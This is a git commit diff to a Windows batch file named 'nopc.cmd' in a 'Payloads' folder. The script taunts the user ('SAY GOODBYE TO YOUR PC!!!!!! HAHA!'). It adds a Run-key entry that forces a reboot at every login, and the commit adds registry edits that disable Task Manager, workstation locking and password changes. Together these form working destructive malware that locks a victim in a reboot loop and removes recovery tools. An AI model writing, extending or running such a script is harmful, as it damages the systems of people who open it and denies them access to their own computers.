966485f8d14667e223199f34db3847f27b7f4cc8
trisiegt <tristan4@mail.com>
2022-02-22 18:15:00 +0000

    edit nopc.cmd

--- Payloads/nopc.cmd
+++ Payloads/nopc.cmd
@@ -16,5 +16,10 @@ if not %ERRORLEVEL%==0 exit
 :definitelynotdeath
 echo SAY GOODBYE TO YOUR PC!!!!!! HAHA!
 ping localhost -n 5>nul
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkStation /t REG_DWORD /d 1
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1
 REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RebootTask /t REG_SZ /d "C:\Windows\System32\shutdown.exe -r -t 0"
 shutdown -r -t 0
